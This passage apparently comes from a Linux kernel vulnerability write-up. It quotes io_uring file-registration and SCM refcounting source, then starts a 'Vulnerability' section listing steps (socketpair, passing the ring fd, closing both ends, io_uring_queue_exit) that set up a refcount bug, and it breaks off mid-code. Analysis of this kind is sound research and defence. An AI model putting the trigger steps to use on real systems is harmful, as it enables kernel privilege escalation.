+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (tags <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">copy_from_user</span>(<span style="color:#f92672">&amp;</span>tag, <span style="color:#f92672">&amp;</span>tags[i], <span style="color:#66d9ef">sizeof</span>(tag)))
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> fail;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (fds <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">copy_from_user</span>(<span style="color:#f92672">&amp;</span>fd, <span style="color:#f92672">&amp;</span>fds[i], <span style="color:#66d9ef">sizeof</span>(fd))) <span style="color:#75715e">// retieves the i-th fd 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#66d9ef">goto</span> fail;
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/* allow sparse sets */</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>fds <span style="color:#f92672">||</span> fd <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>			ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (tag)
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> fail;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fget</span>(fd); <span style="color:#75715e">// [3], get the corresponding `struct file` pointer 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>EBADF;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">unlikely</span>(<span style="color:#f92672">!</span>file))
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> fail;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 * Don&#39;t allow io_uring instances to be registered.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">		 */</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">io_is_uring_fops</span>(file)) { <span style="color:#75715e">// Prevent registering fd returned by io_uring_setup
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>			<span style="color:#a6e22e">fput</span>(file);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> fail;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// !!! THIS CODE SNIPPET REMOVED FROM THE LATEST LINUX KERNEL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">io_scm_file_account</span>(ctx, file);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (ret) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fput</span>(file);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> fail;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// !!!!!!!!!!!!!!!!!!!!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>ENOMEM;
+</span></span><span style="display:flex;"><span>		node <span style="color:#f92672">=</span> <span style="color:#a6e22e">io_rsrc_node_alloc</span>(ctx, IORING_RSRC_FILE);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>node) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fput</span>(file);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> fail;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (tag)
+</span></span><span style="display:flex;"><span>			node<span style="color:#f92672">-&gt;</span>tag <span style="color:#f92672">=</span> tag;
+</span></span><span style="display:flex;"><span>		ctx<span style="color:#f92672">-&gt;</span>file_table.data.nodes[i] <span style="color:#f92672">=</span> node; <span style="color:#75715e">// [4]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">io_fixed_file_set</span>(node, file);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">io_file_bitmap_set</span>(<span style="color:#f92672">&amp;</span>ctx<span style="color:#f92672">-&gt;</span>file_table, i);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* default it to the whole table */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io_file_table_set_alloc_range</span>(ctx, <span style="color:#ae81ff">0</span>, ctx<span style="color:#f92672">-&gt;</span>file_table.data.nr);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>fail:
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io_clear_table_tags</span>(<span style="color:#f92672">&amp;</span>ctx<span style="color:#f92672">-&gt;</span>file_table.data);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io_sqe_files_unregister</span>(ctx);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> ret;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In <strong>[1]</strong>, the function allocate a node(<code>struct io_rsrc_node</code>) array table of size <code>nr_args</code> in context&rsquo;s <strong>file_table</strong> which holds the registered files, which makes 1 node for each file descriptor passed to <code>io_uring_register</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">io_alloc_file_tables</span>(<span style="color:#66d9ef">struct</span> io_ring_ctx <span style="color:#f92672">*</span>ctx, <span style="color:#66d9ef">struct</span> io_file_table <span style="color:#f92672">*</span>table,
+</span></span><span style="display:flex;"><span>			  <span style="color:#66d9ef">unsigned</span> nr_files)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">io_rsrc_data_alloc</span>(<span style="color:#f92672">&amp;</span>table<span style="color:#f92672">-&gt;</span>data, nr_files)) <span style="color:#75715e">// Allocates nodes
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">return</span> false;
+</span></span><span style="display:flex;"><span>	table<span style="color:#f92672">-&gt;</span>bitmap <span style="color:#f92672">=</span> <span style="color:#a6e22e">bitmap_zalloc</span>(nr_files, GFP_KERNEL_ACCOUNT); <span style="color:#75715e">// Allocates the bitmap field
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (table<span style="color:#f92672">-&gt;</span>bitmap)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> true;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io_rsrc_data_free</span>(ctx, <span style="color:#f92672">&amp;</span>table<span style="color:#f92672">-&gt;</span>data);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> false;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__cold <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">io_rsrc_data_alloc</span>(<span style="color:#66d9ef">struct</span> io_rsrc_data <span style="color:#f92672">*</span>data, <span style="color:#66d9ef">unsigned</span> nr)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	data<span style="color:#f92672">-&gt;</span>nodes <span style="color:#f92672">=</span> <span style="color:#a6e22e">kvmalloc_array</span>(nr, <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> io_rsrc_node <span style="color:#f92672">*</span>),
+</span></span><span style="display:flex;"><span>					GFP_KERNEL_ACCOUNT <span style="color:#f92672">|</span> __GFP_ZERO);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (data<span style="color:#f92672">-&gt;</span>nodes) {
+</span></span><span style="display:flex;"><span>		data<span style="color:#f92672">-&gt;</span>nr <span style="color:#f92672">=</span> nr;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>In <strong>[2]</strong>, the function iterates through the supplied file descriptors from userspace, and retieves each time the <code>i</code>-th fd, and retrieves it&rsquo;s corresponding <code>struct file</code> pointer(<strong>[3]</strong>) in the kernel slab.</p>
+<p>It then allocates a node with</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> io_rsrc_node <span style="color:#f92672">*</span><span style="color:#a6e22e">io_rsrc_node_alloc</span>(<span style="color:#66d9ef">struct</span> io_ring_ctx <span style="color:#f92672">*</span>ctx, <span style="color:#66d9ef">int</span> type)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> io_rsrc_node <span style="color:#f92672">*</span>node;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	node <span style="color:#f92672">=</span> <span style="color:#a6e22e">io_cache_alloc</span>(<span style="color:#f92672">&amp;</span>ctx<span style="color:#f92672">-&gt;</span>node_cache, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (node) {
+</span></span><span style="display:flex;"><span>		node<span style="color:#f92672">-&gt;</span>type <span style="color:#f92672">=</span> type;
+</span></span><span style="display:flex;"><span>		node<span style="color:#f92672">-&gt;</span>refs <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>		node<span style="color:#f92672">-&gt;</span>tag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>		node<span style="color:#f92672">-&gt;</span>file_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> node;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>At last , it sets the <code>node-&gt;file_ptr</code> to the file&rsquo;s pointer, and <code>node-&gt;refs</code> to 1; and then this node is stored in the table&rsquo;s <code>i</code>-th node(<strong>[4]</strong>).</p>
+<h2 id="reference-counting-in-io_uring">Reference counting in io_uring</h2>
+<p>Remember this code snippet from the last part:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>		<span style="color:#75715e">// !!! THIS CODE SNIPPET REMOVED FROM THE LATEST LINUX KERNEL
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">io_scm_file_account</span>(ctx, file);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (ret) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fput</span>(file);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> fail;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// !!!!!!!!!!!!!!!!!!!!
+</span></span></span></code></pre></div><p>This is responsible for refcounting the registered file, and it is was present at least until commit <code>9d84bb40bcb30a7fa16f33baa967aeb9953dda78</code>, but it is removed in the time of writing this article(December 2025):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Ensure the UNIX gc is aware of our file set, so we are certain that
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * the io_uring can be safely unregistered on process exit, even if we have
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * loops in the file referencing. We account only files that can hold other
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * files because otherwise they can&#39;t form a loop and so are not interesting
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * for GC.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">__io_scm_file_account</span>(<span style="color:#66d9ef">struct</span> io_ring_ctx <span style="color:#f92672">*</span>ctx, <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#if defined(CONFIG_UNIX)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> sock <span style="color:#f92672">*</span>sk <span style="color:#f92672">=</span> ctx<span style="color:#f92672">-&gt;</span>ring_sock<span style="color:#f92672">-&gt;</span>sk;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sk_buff_head <span style="color:#f92672">*</span>head <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>sk<span style="color:#f92672">-&gt;</span>sk_receive_queue;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> scm_fp_list <span style="color:#f92672">*</span>fpl;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sk_buff <span style="color:#f92672">*</span>skb;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">likely</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">io_file_need_scm</span>(file)))
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * See if we can merge this file into an existing skb SCM_RIGHTS
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * file set. If there&#39;s no room, fall back to allocating a new skb
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * and filling it in.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">spin_lock_irq</span>(<span style="color:#f92672">&amp;</span>head<span style="color:#f92672">-&gt;</span>lock);
+</span></span><span style="display:flex;"><span>	skb <span style="color:#f92672">=</span> <span style="color:#a6e22e">skb_peek</span>(head);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (skb <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">UNIXCB</span>(skb).fp<span style="color:#f92672">-&gt;</span>count <span style="color:#f92672">&lt;</span> SCM_MAX_FD)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">__skb_unlink</span>(skb, head);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>		skb <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">spin_unlock_irq</span>(<span style="color:#f92672">&amp;</span>head<span style="color:#f92672">-&gt;</span>lock);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>skb) {
+</span></span><span style="display:flex;"><span>		fpl <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#f92672">*</span>fpl), GFP_KERNEL);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>fpl)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		skb <span style="color:#f92672">=</span> <span style="color:#a6e22e">alloc_skb</span>(<span style="color:#ae81ff">0</span>, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>skb) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">kfree</span>(fpl);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ENOMEM;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		fpl<span style="color:#f92672">-&gt;</span>user <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_uid</span>(<span style="color:#a6e22e">current_user</span>());
+</span></span><span style="display:flex;"><span>		fpl<span style="color:#f92672">-&gt;</span>max <span style="color:#f92672">=</span> SCM_MAX_FD;
+</span></span><span style="display:flex;"><span>		fpl<span style="color:#f92672">-&gt;</span>count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">UNIXCB</span>(skb).fp <span style="color:#f92672">=</span> fpl;
+</span></span><span style="display:flex;"><span>		skb<span style="color:#f92672">-&gt;</span>sk <span style="color:#f92672">=</span> sk;
+</span></span><span style="display:flex;"><span>		skb<span style="color:#f92672">-&gt;</span>destructor <span style="color:#f92672">=</span> unix_destruct_scm;
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">refcount_add</span>(skb<span style="color:#f92672">-&gt;</span>truesize, <span style="color:#f92672">&amp;</span>sk<span style="color:#f92672">-&gt;</span>sk_wmem_alloc);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	fpl <span style="color:#f92672">=</span> <span style="color:#a6e22e">UNIXCB</span>(skb).fp;
+</span></span><span style="display:flex;"><span>	fpl<span style="color:#f92672">-&gt;</span>fp[fpl<span style="color:#f92672">-&gt;</span>count<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_file</span>(file);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">unix_inflight</span>(fpl<span style="color:#f92672">-&gt;</span>user, file);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">skb_queue_head</span>(head, skb);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fput</span>(file);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>So, this basically fills ring socket&rsquo;s  <code>sk_receive_queue</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sock <span style="color:#f92672">*</span>sk <span style="color:#f92672">=</span> ctx<span style="color:#f92672">-&gt;</span>ring_sock<span style="color:#f92672">-&gt;</span>sk;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sk_buff_head <span style="color:#f92672">*</span>head <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>sk<span style="color:#f92672">-&gt;</span>sk_receive_queue;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	fpl <span style="color:#f92672">=</span> <span style="color:#a6e22e">UNIXCB</span>(skb).fp;
+</span></span><span style="display:flex;"><span>	fpl<span style="color:#f92672">-&gt;</span>fp[fpl<span style="color:#f92672">-&gt;</span>count<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_file</span>(file); <span style="color:#75715e">// store the struct file for the new registered file
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">unix_inflight</span>(fpl<span style="color:#f92672">-&gt;</span>user, file);					<span style="color:#75715e">// increment inflight number
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">skb_queue_head</span>(head, skb);							<span style="color:#75715e">// add the new sbk(that holds a pointer to the new registered file) to the ring&#39;s queue.
+</span></span></span></code></pre></div><h2 id="vulnerability">Vulnerability</h2>
+<p>First off, keep in mind that during <strong>io_uring</strong> setup phase, it allocate a <code>struct file</code> that backs the returnd io_uring fd:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Sets up an aio uring context, and returns the fd. Applications asks for a
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * ring size, we return the actual sq/cq ring sizes (among other things) in the
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * params structure passed in.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">io_uring_setup</span>(u32 entries, <span style="color:#66d9ef">struct</span> io_uring_params __user <span style="color:#f92672">*</span>params)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> io_uring_params p;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> i;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">copy_from_user</span>(<span style="color:#f92672">&amp;</span>p, params, <span style="color:#66d9ef">sizeof</span>(p)))
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EFAULT;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">ARRAY_SIZE</span>(p.resv); i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (p.resv[i])
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (p.flags <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>IORING_SETUP_FLAGS)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">io_uring_create</span>(entries, <span style="color:#f92672">&amp;</span>p, params); <span style="color:#75715e">// &lt;----------------------- HERE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> __cold <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">io_uring_create</span>(<span style="color:#66d9ef">unsigned</span> entries, <span style="color:#66d9ef">struct</span> io_uring_params <span style="color:#f92672">*</span>p,
+</span></span><span style="display:flex;"><span>				  <span style="color:#66d9ef">struct</span> io_uring_params __user <span style="color:#f92672">*</span>params)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ....
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	file <span style="color:#f92672">=</span> <span style="color:#a6e22e">io_uring_get_file</span>(ctx); <span style="color:#75715e">// &lt;-----------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">IS_ERR</span>(file)) {
+</span></span><span style="display:flex;"><span>		ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">PTR_ERR</span>(file);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> err;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * Allocate an anonymous fd, this is what constitutes the application
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * visible backing of an io_uring instance. The application mmaps this
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * fd to gain access to the SQ/CQ ring details.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span><span style="color:#a6e22e">io_uring_get_file</span>(<span style="color:#66d9ef">struct</span> io_ring_ctx <span style="color:#f92672">*</span>ctx)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/* Create a new inode so that the LSM can block the creation.  */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">anon_inode_create_getfile</span>(<span style="color:#e6db74">&#34;[io_uring]&#34;</span>, <span style="color:#f92672">&amp;</span>io_uring_fops, ctx, <span style="color:#75715e">// &lt;----------------------- AND THEN HERE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>					 O_RDWR <span style="color:#f92672">|</span> O_CLOEXEC, NULL);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Now, after setting up an io_uring env, let&rsquo;s consider this scenario: <br>
+1- Create socketpair s[0], s[1]. <br>
+2- Send io_uring&rsquo;s fd from s[0] to s[1] as explained previously. <br>
+3- Close s[0] and s[1]. <br>
+4- Call <code>io_uring_queue_exit</code> to decrease the ring&rsquo;s <code>fd</code> refcount down to 1 (having the <code>inflight == 1</code> due to step <strong>2</strong>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>__cold <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">io_uring_queue_exit</span>(<span style="color:#66d9ef">struct</span> io_uring <span style="color:#f92672">*</span>ring)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> io_uring_sq <span style="color:#f92672">*</span>sq <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>ring<span style="color:#f92672">-&gt;</span>sq;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> io_uring_cq <span style="color:#f92672">*</span>cq <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>ring<span style="color:#f92672">-&gt;</span>cq;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(ring<span style="color:#f92672">-&gt;</span>int_flags <span style="color:#f92672">&amp;</span> INT_FLAG_APP_MEM)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">__sys_munmap</span>(sq<span style="color:#f92672">-&gt;</span>sqes, <span style="color:#a6e22e">io_uring_sqes_size</span>(ring));
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">io_uring_unmap_rings</span>(sq, cq);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * Not strictly required, but frees up the slot we used now rather
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 * than at process exit time.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	 */</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ring<span style="color:#f92672">-&gt;</span>int_flags <span style="color:#f92672">&amp;</span> INT_FLAG_REG_RING)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">io_uring_unregister_ring_fd</span>(ring); <span style="color:#75715e">// Unregistering the rings
